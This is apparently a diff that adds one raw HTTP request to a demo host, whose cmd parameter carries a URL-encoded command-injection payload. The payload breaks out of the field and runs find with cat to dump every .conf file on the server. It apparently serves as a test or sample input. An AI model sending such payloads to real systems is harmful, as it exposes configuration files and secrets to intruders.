@@ -1,0 +1,4 @@
+GET /a?cmd=";%20find%20/%20-name%20*.conf%20-exec%20cat%20{}%20\;" HTTP/1.1
+Host: demo.example.com
+Connection: close
+
